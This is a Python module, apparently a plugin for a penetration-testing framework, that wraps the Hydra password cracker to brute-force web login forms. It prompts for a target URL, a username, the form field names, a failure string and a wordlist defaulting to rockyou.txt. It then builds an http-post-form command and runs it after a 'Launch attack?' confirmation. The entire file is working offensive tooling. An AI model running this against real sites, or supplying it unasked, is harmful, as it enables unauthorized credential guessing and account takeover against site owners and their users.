import subprocess
from urllib.parse import urlparse


PROVIDES = []
REQUIRES = []


def run(data, cred, args):

    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD = '\033[1m'

    domain = data.get("domain")

    default_url = (
        f"http://{domain}"
        if domain else
        "http://target/login.php"
    )

    print(
        f"\n{B}┌── {BOLD}MODULE: HYDRA HTTP FORM{W}{B} ─────────────────────┐{W}"
    )
    print(
        f"{B}└──────────────────────────────────────────────────────────┘{W}"
    )

    url = input(
        f"\nTarget URL\n"
        f"(default: {default_url})\n> "
    ).strip()

    if not url:
        url = default_url

    username = input(
        "\nUsername\n> "
    ).strip()

    if not username:
        print(
            f"\n{R}[!] Username required{W}"
        )
        return

    username_field = input(
        "\nUsername Field\n"
        "(default: username)\n> "
    ).strip() or "username"

    password_field = input(
        "\nPassword Field\n"
        "(default: password)\n> "
    ).strip() or "password"

    failure = input(
        "\nFailure String\n> "
    ).strip()

    if not failure:
        print(
            f"\n{R}[!] Failure string required{W}"
        )
        return

    wordlist = input(
        "\nWordlist\n"
        "(default: /usr/share/wordlists/rockyou.txt)\n> "
    ).strip()

    if not wordlist:
        wordlist = (
            "/usr/share/wordlists/"
            "rockyou.txt"
        )

    parsed = urlparse(url)

    host = parsed.netloc

    if not host:
        print(
            f"\n{R}[!] Invalid URL{W}"
        )
        return

    path = parsed.path

    if not path:
        path = "/"

    hydra_target = (
        f"{path}:"
        f"{username_field}={username}&"
        f"{password_field}=^PASS^:"
        f"{failure}"
    )

    cmd = [
        "hydra",
        "-l",
        username,
        "-P",
        wordlist,
        host,
        "http-post-form",
        hydra_target
    ]

    print(
        f"\n{B}[{W}{G}*{W}{B}]{W} "
        f"{BOLD}COMMAND{W}\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    confirm = input(
        "Launch attack? [Y/n] "
    ).strip().lower()

    if confirm not in (
        "",
        "y",
        "yes"
    ):
        return

    subprocess.run(cmd)
